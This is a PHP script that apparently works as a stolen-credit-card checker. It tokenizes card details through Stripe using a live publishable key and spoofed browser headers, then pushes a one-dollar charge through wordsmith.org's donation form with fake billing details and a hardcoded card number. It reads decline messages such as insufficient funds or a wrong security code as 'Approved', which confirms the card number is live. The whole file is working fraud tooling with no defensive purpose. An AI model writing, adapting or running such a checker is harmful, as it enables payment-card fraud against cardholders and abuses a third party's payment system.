<?php
 
 function GetStr($string, $start, $end){
  $str = explode($start, $string);
  $str = explode($end, $str[1]);  
  return $str[0];
  };

$cc = "";
$sacar= explode("|", $cc);

$cc   = $sacar[0];
$mes   = $sacar[2];
$ano  = $sacar[3];
$cvv  = $sacar[4];



  $ch = curl_init();

  curl_setopt($ch, CURLOPT_URL, 'https://m.stripe.com/6');
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'Host: m.stripe.com',
  "user-agent: Mozilla/5.0 (Windows NT '.$se.'.0; Win64; x64) AppleWebKit/'.$sa.'.'.$se.' (KHTML, like Gecko) Chrome/'.$se.'.0.'.$si.'.'.$sa.' Safari/'.$sa.'.'.$se.''))",
  'path: /v1/payment_methods',
  'Accept: */*',
  'accept-language: en-US,en;q=0.9',
  'Content-type: text/plain;charset=UTF-8',
  'Origin: https://m.stripe.network',
  'Referer: https://m.stripe.network/inner.html'));
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  
     curl_setopt($ch, CURLOPT_POSTFIELDS, "");
     $resultado13 = curl_exec($ch);
     $muid = trim(strip_tags(getStr($resultado13,'"muid":"','"')));
     $sid = trim(strip_tags(getStr($resultado13,'"sid":"','"')));
     $guid = trim(strip_tags(getStr($resultado13,'"guid":"','"')));
    
  
     $ch = curl_init();
 
     curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
     curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
     curl_setopt($ch, CURLOPT_HEADER, 0);
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
     'authority: api.stripe.com',
     'method: POST',
     'path: /v1/tokens',
     'scheme: https',
     'accept: application/json',
     'accept-language: es-ES,es;q=0.9',
     'content-type: application/x-www-form-urlencoded',
     'origin: https://js.stripe.com',
     'referer: https://js.stripe.com/',
     'sec-fetch-dest: empty',
     'sec-fetch-mode: cors',
     'sec-fetch-site: same-site',
     "user-agent: Mozilla/5.0 (Windows NT '.$se.'.0; Win64; x64) AppleWebKit/'.$sa.'.'.$se.' (KHTML, like Gecko) Chrome/'.$se.'.0.'.$si.'.'.$sa.' Safari/'.$sa.'.'.$se.''))",
     ));
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
     curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
     curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_POSTFIELDS, "time_on_page=158609&guid=$guid&muid=$muid&sid=$sid&key=pk_live_rLnTHKWmLt3dVcKCiyrE8oqT&payment_user_agent=stripe.js%2F78ef418&card[number]=$cc&card[cvc]=$cvv&card[exp_month]=$mes&card[exp_year]=$ano");
     $resultado14 = curl_exec($ch);
     
           $token = trim(strip_tags(getStr($resultado14,'"id": "','"')));

           $ch = curl_init();
  
         curl_setopt($ch, CURLOPT_URL, 'https://wordsmith.org/contribute/payment.php?amount=1&payment=undefined');
         curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
         curl_setopt($ch, CURLOPT_HEADER, 0);
         curl_setopt($ch, CURLOPT_HTTPHEADER, array(
         'authority: : wordsmith.org',
         'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
         'accept-language: en-US,en;q=0.9',
         'Content-Type: application/x-www-form-urlencoded',
         "Cookie: __stripe_sid=$sid; __stripe_mid=$muid",
         'origin: https://wordsmith.org',
         'referer: https://wordsmith.org/contribute/payment.php?amount=1&payment=undefined',
         'sec-fetch-dest: document',
         'sec-fetch-mode: navigate',
         'sec-fetch-site: same-origin',
         "user-agent: Mozilla/5.0 (Windows NT '.$se.'.0; Win64; x64) AppleWebKit/'.$sa.'.'.$se.' (KHTML, like Gecko) Chrome/'.$se.'.0.'.$si.'.'.$sa.' Safari/'.$sa.'.'.$se.''))",
         ));
         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
         curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
         curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
         curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
         
         curl_setopt($ch, CURLOPT_POSTFIELDS, "payment_type=undefined&total_amount=1&gift=none&first_name=Cristian&last_name=Martin&street=New+york+street+253&city=new+york&state=NY&postalcode=10080&country=AU&email_address=dsadsjdk%40gmail.com&card_number=4169+1608+3148+1990&mm=10&yy=2023&cvv=232&comments=&stripeToken=$token");
         $result1 = curl_exec($ch);
   
         $msg = trim(strip_tags(getStr($result1,'<div class="alert alert-warning alert-dismissible payment-errors" role="alert">','<')));

$declined = "Declined";
if($msg == "Your card's security code is invalid.") {
          
          $declined = "Approved ✅";
               }
          
           if($msg == "Your card has insufficient funds.") {
          
          $declined = "Approved ✅";
                   }
          
           if($msg == "Your card's security code is incorrect.") {
          
          $declined = "Approved ✅";
                 }
echo"response: $msg - $declined ";
 ?>